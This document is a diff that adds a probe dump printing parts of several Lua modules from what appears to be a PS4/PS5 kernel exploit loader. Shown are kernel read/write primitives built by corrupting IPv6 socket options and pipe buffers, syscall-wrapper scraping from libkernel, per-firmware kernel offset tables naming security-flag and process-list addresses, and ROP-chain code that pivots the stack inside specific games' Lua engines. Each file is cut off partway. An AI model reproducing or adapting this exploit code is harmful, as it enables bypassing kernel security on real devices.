@@ -1,0 +1,611 @@
+=== PROBE 143i: READ LOADER MODULES ===
+--- kernel.lua ---
+[+] kernel.lua: 13531 bytes
+
+-- class for kernel memory r/w
+
+kernel = {}
+
+kernel.addr = {}
+
+-- these vars need to be defined for other fns to work properly
+kernel.copyout = nil
+kernel.copyin = nil
+kernel.read_buffer = nil
+kernel.write_buffer = nil
+
+function kernel.read_byte(kaddr)
+    local value = kernel.read_buffer(kaddr, 1)
+    return value and #value == 1 and uint64.unpack(value) or nil 
+end
+
+function kernel.read_word(kaddr)
+    local value = kernel.read_buffer(kaddr, 2)
+    return value and #value == 2 and uint64.unpack(value) or nil 
+end
+
+function kernel.read_dword(kaddr)
+    local value = kernel.read_buffer(kaddr, 4)
+    return value and #value == 4 and uint64.unpack(value) or nil 
+end
+
+function kernel.read_qword(kaddr)
+    local value = kernel.read_buffer(kaddr, 8)
+    return value and #value == 8 and uint64.unpack(value) or nil 
+end
+
+function kernel.hex_dump(kaddr, size)
+    size = size or 0x40
+    return hex_dump(kernel.read_buffer(kaddr, size), kaddr)
+end
+
+function kernel.read_null_terminated_string(kaddr)
+    
+    local result = ""
+
+    while true do
+        local chunk = kernel.read_buffer(kaddr, 0x8)
+        local null_pos = chunk:find("\0")
+        if null_pos then 
+            return result .. chunk:sub(1, null_pos - 1)
+        end
+        result = result .. chunk
+        kaddr = kaddr + #chunk
+    end
+    
+    if string.byte(result[1]) == 0 then
+        return nil
+    end
+
+    return result
+end
+
+function kernel.write_byte(dest, value)
+    kernel.write_buffer(dest, ub8(value):sub(1,1))
+end
+
+function kernel.write_word(dest, value)
+    kernel.write_buffer(dest, ub8(value):sub(1,2))
+end
+
+function kernel.write_dword(dest, value)
+    kernel.write_buffer(dest, ub8(value):sub(1,4))
+end
+
+function kernel.write_qword(dest, value)
+    kernel.write_buffer(dest, ub8(value):sub(1,8))
+end
+
+
+
+
+
+-- provide fast kernel r/w through pipe pair & ipv6
+
+ipv6_kernel_rw = {}
+
+ipv6_kernel_rw.data = {}
+
+function ipv6_kernel_rw.init(ofiles, kread8, kwrite8)
+
+    ipv6_kernel_rw.ofiles = ofiles
+    ipv6_kernel_rw.kread8 = kread8
+    ipv6_kernel_rw.kwrite8 = kwrite8
+
+    ipv6_kernel_rw.create_pipe_pair()
+    ipv6_kernel_rw.create_overlapped_ipv6_sockets()
+end
+
+function ipv6_kernel_rw.get_fd_data_addr(fd)
+    local filedescent_addr = ipv6_kernel_rw.ofiles + fd * kernel_offset.SIZEOF_OFILES
+    local file_addr = ipv6_kernel_rw.kread8(filedescent_addr + 0x0) -- fde_file
+    return ipv6_kernel_rw.kread8(file_addr + 0x0) -- f_data
+end
+
+function ipv6_kernel_rw.create_pipe_pair()
+
+    local read_fd, write_fd = create_pipe()
+    
+    ipv6_kernel_rw.data.pipe_read_fd = read_fd
+    ipv6_kernel_rw.data.pipe_write_fd = write_fd
+    ipv6_kernel_rw.data.pipe_addr = ipv6_kernel_rw.get_fd_data_addr(read_fd)
+    ipv6_kernel_rw.data.pipemap_buffer = memory.alloc(0x14)
+    ipv6_kernel_rw.data.read_mem = memory.alloc(PAGE_SIZE)
+end
+
+-- overlap the pktopts of two IPV6 sockets
+function ipv6_kernel_rw.create_overlapped_ipv6_sockets()
+
+    local master_target_buffer = memory.alloc(0x14)
+    local slave_buffer = memory.alloc(0x14)
+    local pktinfo_size_store = memory.alloc(0x8)
+    
+    memory.write_qword(pktinfo_size_store, 0x14)
+
+    local master_sock = syscall.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP):tonumber()
+    local victim_sock = syscall.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP):tonumber()
+
+    syscall.setsockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, master_target_buffer, 0x14)
+    syscall.setsockopt(victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, slave_buffer, 0x14)
+
+    local master_so = ipv6_kernel_rw.get_fd_data_addr(master_sock)
+    local master_pcb = ipv6_kernel_rw.kread8(master_so + kernel_offset.SO_PCB)
+    local master_pktopts = ipv6_kernel_rw.kread8(master_pcb + kernel_offset.INPCB_PKTOPTS)
+
+    local slave_so = ipv6_kernel_rw.get_fd_data_addr(victim_sock)
+    local slave_pcb = ipv6_kernel_rw.kread8(slave_so + kernel_offset.SO_PCB)
+    local slave_pktopts = ipv6_kernel_rw.kread8(slave_pcb + kernel_offset.INPCB_PKTOPTS)
+
+    -- magic
+    ipv6_kernel_rw.kwrite8(master_pktopts + 0x10, slave_pktopts + 0x10)
+
+    ipv6_kernel_rw.data.master_target_buffer = master_target_buffer
+    ipv6_kernel_rw.data.slave_buffer = slave_buffer
+    ipv6_kernel_rw.data.pktinfo_size_store = pktinfo_size_store
+    ipv6_kernel_rw.data.master_sock = master_sock
+    ipv6_kernel_rw.data.victim_sock = victim_sock
+end
+
+function ipv6_kernel_rw.ipv6_write_to_victim(kaddr)
+    memory.write_qword(ipv6_kernel_rw.data.master_target_buffer, kaddr)
+    memory.write_qword(ipv6_kernel_rw.data.master_target_buffer + 0x8, 0)
+    memory.write_dword(ipv6_kernel_rw.data.master_target_buffer + 0x10, 0)
+    syscall.setsockopt(ipv6_kernel_rw.data.master_sock, IPPROTO_IPV6, IPV6_PKTINFO, ipv6_kernel_rw.data.master_target_buffer, 0x14)
+end
+
+function ipv6_kernel_rw.ipv6_kread(kaddr, buffer_addr)
+    ipv6_kernel_rw.ipv6_write_to_victim(kaddr)
+    syscall.getsockopt(ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buffer_addr, ipv6_kernel_rw.data.pktinfo_size_store)
+end
+
+function ipv6_kernel_rw.ipv6_kwrite(kaddr, buffer_addr)
+    ipv6_kernel_rw.ipv6_write_to_victim(kaddr)
+    syscall.setsockopt(ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buffer_addr, 0x14)
+end
+
+function ipv6_kernel_rw.ipv6_kread8(kaddr)
+    ipv6_kernel_rw.ipv6_kread(kaddr, ipv6_kernel_rw.data.slave_buffer)
+    return memory.read_qword(ipv6_kernel_rw.data.slave_buffer)
+end
+
+function ipv6_kernel_rw.copyout(kaddr, uaddr, len)
+
+    assert(kaddr and uaddr and len)
+
+    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, uint64("0x4000000040000000"))
+    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, uint64("0x4000000000000000"))
+    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
+    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer)
+
+    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, kaddr)
+    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, 0)
+    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
+    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10, ipv6_kernel_rw.data.pipemap_buffer)
+    
+    syscall.read(ipv6_kernel_rw.data.pipe_read_fd, uaddr, len)
+end
+
+function ipv6_kernel_rw.copyin(uaddr, kaddr, len)
+
+    assert(kaddr and uaddr and len)
+
+    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, 0)
+    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, uint64("0x4000000000000000"))
+    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
+    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer)
+
+    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, kaddr)
+    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, 0)
+    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
+    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10, ipv6_kernel_rw.data.pipemap_buffer)
+
+    syscall.write(ipv6_kernel_rw.data.pipe_write_fd, uaddr, len)
+end
+
+function ipv6_kernel_rw.read_buffer(kaddr, len)
+
+    local mem = ipv6_kernel_rw.data.read_mem
+    if len > PAGE_SIZE then
+        mem = memory.alloc(len)
+    end
+
+    ipv6_kernel_rw.copyout(kaddr, mem, len)
+    return memory.read_buffer(mem, len)
+end
+
+function ipv6_kernel_rw.write_buffer(kaddr, buf)
+    ipv6_kernel_rw.copyin(lua.resolve_value(buf), kaddr, #buf)
+end
+
+
+
+
+
+-- cpu page table
+
+CPU_PDE_SHIFT = {
+    PRESENT = 0,
+    RW = 1,
+    USER = 2,
+    WRITE_THROUGH = 3,
+    CACHE_DISABLE = 4,
+    ACCESSED = 5,
+    DIRTY = 6,
+    PS = 7,
+    GLOBAL = 8,
+    XOTEXT = 58,
+    PROTECTION_KEY = 59,
+    EXECUTE_DISABLE = 63
+}
+
+CPU_PDE_MASKS = {
+    PRESENT = 1,
+    RW = 1,
+    USER = 1,
+    WRITE_THROUGH = 1,
+    CACHE_DISABLE = 1,
+    ACCESSED = 1,
+    DIRTY = 1,
+    PS = 1,
+    GLOBAL = 1,
+    XOTEXT = 1,
+    PROTECTION_KEY = 0xf,
+    EXECUTE_DISABLE = 1
+}
+
+CPU_PG_PHYS_FRAME = uint64("0x000ffffffffff000")
+CPU_PG_PS_FRAME = uint64("0x000fffffffe00000")
+
+function cpu_pde_field(pde, field)
+    local shift = CPU_PDE_SHIFT[field]
+... (truncated at 8000/13531)
+
+--- syscall.lua ---
+[+] syscall.lua: 3031 bytes
+
+--
+-- syscall class
+--
+-- helper for managing & resolving syscalls
+--
+
+syscall = {}
+
+function syscall.init()
+
+    syscall.collect_info()
+
+    print("[+] libkernel base @ " .. hex(libkernel_base))
+    print("[+] platform @ " .. PLATFORM)
+
+    if PLATFORM == "ps4" then  -- ps4 requires valid syscall wrapper, which we can scrape from libkernel .text
+        local libkernel_text = memory.read_buffer(libkernel_base, 0x40000)
+        -- mov rax, <num>; mov r10, rcx; syscall
+        local matches = find_pattern(libkernel_text, "48 c7 c0 ? ? ? ? 49 89 ca 0f 05")
+        syscall.syscall_wrapper = {}
+        for i,offset in ipairs(matches) do
+            local num = uint64.unpack(libkernel_text:sub(offset+3, offset+6))
+            syscall.syscall_wrapper[num:tonumber()] = libkernel_base + offset - 1
+        end
+    elseif PLATFORM == "ps5" then -- can be any syscall wrapper in libkernel
+        local gettimeofday = memory.read_qword(libc_addrofs.gettimeofday_import)
+        syscall.syscall_address = gettimeofday + 7  -- +7 is to skip "mov rax, <num>" instruction
+    else
+        errorf("invalid platform %s", PLATFORM)
+    end
+
+    syscall.do_sanity_check()
+end
+
+function syscall.collect_info()
+
+    -- ref: https://github.com/shadps4-emu/shadPS4/blob/0bdd21b4e49c25955b16a3651255381b4a60f538/src/core/module.h#L32
+    local INIT_PROC_ADDR_OFFSET = 0x128
+    local SEGMENTS_OFFSET = 0x160
+    
+    local sceKernelGetModuleInfoFromAddr = fcall(libc_addrofs.sceKernelGetModuleInfoFromAddr)
+    
+    local addr_inside_libkernel = memory.read_qword(libc_addrofs.gettimeofday_import)
+    local mod_info = memory.alloc(0x300)
+
+    local ret = sceKernelGetModuleInfoFromAddr(addr_inside_libkernel, 1, mod_info):tonumber()
+    if ret ~= 0 then
+        error("sceKernelGetModuleInfoFromAddr() error: " .. hex(ret))
+    end
+    
+    libkernel_base = memory.read_qword(mod_info + SEGMENTS_OFFSET)
+
+    -- credit to flatz for this technique
+    local init_proc_addr = memory.read_qword(mod_info + INIT_PROC_ADDR_OFFSET)
+    local delta = (init_proc_addr - libkernel_base):tonumber()
+    
+    if delta == 0x0 then
+        PLATFORM = "ps4"
+    elseif delta == 0x10 then
+        PLATFORM = "ps5"
+    else
+        error("failed to determine PLATFORM")
+    end
+end
+
+function syscall.resolve(list)
+    for name, num in pairs(list) do
+        if not syscall[name] then
+            if PLATFORM == "ps4" then
+                if syscall.syscall_wrapper[num] then
+                    syscall[name] = fcall(syscall.syscall_wrapper[num], num)
+                else
+                    errorf("syscall wrapper for %s (%d) not found in libkernel", name, num)
+                end
+            elseif PLATFORM == "ps5" then
+                syscall[name] = fcall(syscall.syscall_address, num)
+            end
+        end
+    end
+end
+
+function syscall.do_sanity_check()
+
+    syscall.resolve({
+        getpid = 20,
+    })
+
+    local pid = syscall.getpid()
+    if not (pid and pid.h == 0 and pid.l ~= 0) then
+        error("syscall test failed")
+    end
+end
+
+--- kernel_offset.lua ---
+[+] kernel_offset.lua: 15754 bytes
+
+-- kernel offsets
+-- credit to @hammer-83 for these offsets
+-- https://github.com/hammer-83/ps5-jar-loader/blob/main/sdk/src/main/java/org/ps5jb/sdk/core/kernel/KernelOffsets.java
+
+ps5_kernel_offset_list = {
+
+    [{ "1.00", "1.01", "1.02" }] = {
+
+        DATA_BASE = 0x01B40000,
+        DATA_SIZE = 0x08631930,
+
+        DATA_BASE_DYNAMIC = 0x00000000,
+        DATA_BASE_TO_DYNAMIC = 0x0658BB58,
+        DATA_BASE_ALLPROC = 0x026D1BF8,
+        DATA_BASE_SECURITY_FLAGS = 0x06241074,
+        DATA_BASE_ROOTVNODE = 0x06565540,
+        DATA_BASE_KERNEL_PMAP_STORE = 0x02F9F2B8,
+        DATA_BASE_DATA_CAVE = 0x05F20000,
+        DATA_BASE_GVMSPACE = 0x06202E70,
+
+        PMAP_STORE_PML4PML4I = -0x1C,
+        PMAP_STORE_DMPML4I = 0x288,
+        PMAP_STORE_DMPDPI = 0x28C,
+    },
+    
+    [{ "1.05", "1.10", "1.11", "1.12", "1.13", "1.14" }] = {
+
+        DATA_BASE = 0x01B40000,
+        DATA_SIZE = 0x08631930,
+
+        DATA_BASE_DYNAMIC = 0x00000000,
+        DATA_BASE_TO_DYNAMIC = 0x0658BB58,
+        DATA_BASE_ALLPROC = 0x026D1C18,
+        DATA_BASE_SECURITY_FLAGS = 0x06241074,
+        DATA_BASE_ROOTVNODE = 0x06565540,
+        DATA_BASE_KERNEL_PMAP_STORE = 0x02F9F328,
+        DATA_BASE_DATA_CAVE = 0x05F20000,
+        DATA_BASE_GVMSPACE = 0x06202E70,
+
+        PMAP_STORE_PML4PML4I = -0x1C,
+        PMAP_STORE_DMPML4I = 0x288,
+        PMAP_STORE_DMPDPI = 0x28C,
+    },
+    
+    [{ "2.00", "2.20", "2.25", "2.26", "2.30", "2.50", "2.70" }] = {
+
+        DATA_BASE = 0x01B80000,
+        DATA_SIZE = 0x087E1930,
+
+        DATA_BASE_DYNAMIC = 0x00000000,
+        DATA_BASE_TO_DYNAMIC = 0x06739B88,
+        DATA_BASE_ALLPROC = 0x02701C28,
+        DATA_BASE_SECURITY_FLAGS = 0x063E1274,
+        DATA_BASE_ROOTVNODE = 0x067134C0,
+        DATA_BASE_KERNEL_PMAP_STORE = 0x031338C8,
+        DATA_BASE_DATA_CAVE = 0x060C0000,  -- Use same as Specter's Byepervisor repo for interop
+        DATA_BASE_GVMSPACE = 0x063A2EB0,
+
+        PMAP_STORE_PML4PML4I = -0x1C,
+        PMAP_STORE_DMPML4I = 0x288,
+        PMAP_STORE_DMPDPI = 0x28C,
+    },
+
+    [{ "3.00", "3.20", "3.21" }] = {
+
+        DATA_BASE = 0x0BD0000,
+        DATA_SIZE = 0x08871930,
+
+        DATA_BASE_DYNAMIC = 0x00010000,
+        DATA_BASE_TO_DYNAMIC = 0x067D1B90,
+        DATA_BASE_ALLPROC = 0x0276DC58,
+        DATA_BASE_SECURITY_FLAGS = 0x06466474,
+        DATA_BASE_ROOTVNODE = 0x067AB4C0,
+        DATA_BASE_KERNEL_PMAP_STORE = 0x031BE218,
+        DATA_BASE_DATA_CAVE = 0x06140000,  -- Unconfirmed
+        DATA_BASE_GVMSPACE = 0x06423F80,
+
+        PMAP_STORE_PML4PML4I = -0x1C,
+        PMAP_STORE_DMPML4I = 0x288,
+        PMAP_STORE_DMPDPI = 0x28C,
+    },
+
+    [{ "4.00", "4.02", "4.03", "4.50", "4.51" }] = {
+
+        DATA_BASE = 0x0C00000,
+        DATA_SIZE = 0x087B1930,
+
+        DATA_BASE_DYNAMIC = 0x00010000,
+        DATA_BASE_TO_DYNAMIC = 0x0670DB90,
+        DATA_BASE_ALLPROC = 0x027EDCB8,
+        DATA_BASE_SECURITY_FLAGS = 0x06506474,
+        DATA_BASE_ROOTVNODE = 0x066E74C0,
+        DATA_BASE_KERNEL_PMAP_STORE = 0x03257A78,
+        DATA_BASE_DATA_CAVE = 0x06C01000,  -- Unconfirmed
+        DATA_BASE_GVMSPACE = 0x064C3F80,
+
+        PMAP_STORE_PML4PML4I = -0x1C,
+        PMAP_STORE_DMPML4I = 0x288,
+        PMAP_STORE_DMPDPI = 0x28C,
+    },
+
+    [{ "5.00", "5.02" , "5.10"}] = {
+
+        DATA_BASE = 0x0C40000,
+        DATA_SIZE = 0x08921930,
+
+        DATA_BASE_DYNAMIC = 0x00010000,
+        DATA_BASE_TO_DYNAMIC = 0x06879C00,
+        DATA_BASE_ALLPROC = 0x0291DD00,
+        DATA_BASE_SECURITY_FLAGS = 0x066466EC,
+        DATA_BASE_ROOTVNODE = 0x06853510,
+        DATA_BASE_KERNEL_PMAP_STORE = 0x03398A88,
+        DATA_BASE_DATA_CAVE = 0x06320000,  -- Unconfirmed
+        DATA_BASE_GVMSPACE = 0x06603FB0,
+
+        PMAP_STORE_PML4PML4I = -0x105C,
+        PMAP_STORE_DMPML4I = 0x29C,
+        PMAP_STORE_DMPDPI = 0x2A0,
+    },
+
+    [{ "5.50" }] = {
+
+        DATA_BASE = 0x0C40000,
+        DATA_SIZE = 0x08921930,
+
+        DATA_BASE_DYNAMIC = 0x00010000,
+        DATA_BASE_TO_DYNAMIC = 0x06879C00,
+        DATA_BASE_ALLPROC = 0x0291DD00,
+        DATA_BASE_SECURITY_FLAGS = 0x066466EC,
+... (truncated at 4000/15754)
+
+--- native.lua ---
+[+] native.lua: 8273 bytes
+
+native_cmd = {
+    read_buffer = 0,
+    write_buffer = 1,
+    fcall = 2,
+}
+
+native = {}
+
+function native.register()
+
+    local pivot_handler = gadgets.stack_pivot[2]
+    native.pivot_handler_rop = native.setup_pivot_handler(pivot_handler)
+    
+    native_cmd_handler = native.create_cmd_handler()
+    native_invoke = lua.create_fake_cclosure(pivot_handler.gadget_addr)
+
+    syscall.do_sanity_check()
+end
+
+function native.get_lua_opt(chain, fn, a1, a2, a3)
+    chain:push_fcall_raw(fn, function()
+        chain:push_set_rdx(a3)
+        chain:push_set_rsi(a2)
+        chain:push_set_reg_from_memory("rdi", a1)
+    end)
+    chain:push_store_retval()
+end
+
+function native.gen_fcall_chain(lua_state)
+
+    local chain = ropchain()
+    
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 3, 0)  -- 1 - fn addr
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 4, 0)  -- 2 - rax (for syscall)
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 5, 0)  -- 3 - rdi
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 6, 0)  -- 4 - rsi
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 7, 0)  -- 5 - rdx
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 8, 0)  -- 6 - rcx
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 9, 0)  -- 7 - r8
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 10, 0)  -- 8 - r9
+
+    local prep_arg_callback = function()
+        chain:push_set_reg_from_memory("r9", chain.retval_addr[8])
+        chain:push_set_reg_from_memory("r8", chain.retval_addr[7])
+        chain:push_set_reg_from_memory("rcx", chain.retval_addr[6])
+        chain:push_set_reg_from_memory("rdx", chain.retval_addr[5])
+        chain:push_set_reg_from_memory("rsi", chain.retval_addr[4])
+        chain:push_set_reg_from_memory("rdi", chain.retval_addr[3])
+        chain:push_set_rax_from_memory(chain.retval_addr[2])
+    end
+
+    chain:push_fcall_raw(chain.retval_addr[1], prep_arg_callback, true)
+    chain:push_store_retval()
+
+    -- pass return value to caller
+    chain:push_fcall_raw(eboot_addrofs.lua_pushinteger, function()
+        chain:push_set_reg_from_memory("rsi", chain:get_last_retval_addr())
+        chain:push_set_reg_from_memory("rdi", lua_state)
+    end)
+
+    return chain
+end
+
+function native.gen_read_buffer_chain(lua_state)
+
+    local chain = ropchain()
+
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 3, 0)  -- 1 - addr to read
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 4, 0)  -- 2 - size
+
+    chain:push_fcall_raw(eboot_addrofs.lua_pushlstring, function()
+        chain:push_set_reg_from_memory("rdx", chain.retval_addr[2])
+        chain:push_set_reg_from_memory("rsi", chain.retval_addr[1])
+        chain:push_set_reg_from_memory("rdi", lua_state)
+    end)
+
+    return chain
+end
+
+function native.gen_write_buffer_chain(lua_state)
+
+    local chain = ropchain()
+
+    chain.string_len = memory.alloc(0x8)
+
+    native.get_lua_opt(chain, eboot_addrofs.luaL_optinteger, lua_state, 3, 0)  -- 1 - dest to write
+    native.get_lua_opt(chain, eboot_addrofs.luaL_checklstring, lua_state, 4, chain.string_len)  -- 2 - src buffer
+
+    chain:push_fcall_raw(libc_addrofs.memcpy, function()
+        chain:push_set_reg_from_memory("rdx", chain.string_len)
+        chain:push_set_reg_from_memory("rsi", chain.retval_addr[2])
+        chain:push_set_reg_from_memory("rdi", chain.retval_addr[1])
+    end)
+
+    return chain
+end
+
+function native.setup_cmd_handler(pivot_handler)
+
+    -- todo: setting hardcoded offset like this is bad. improve this
+    local stack_offset = -0x78
+    if game_name == "HamidashiCreative" or
+       game_name == "Aikagi2" or
+       game_name == "JinkiResurrection" or
+       game_name == "FuyuKiss" or
+       game_name == "C" or
+       game_name == "F" then
+        stack_offset = -0x68
+    end
+
+    local chain = ropchain()
+
+    chain.jmpbuf = memory.alloc(0x100)
+... (truncated at 4000/8273)
+
+=== DONE ===
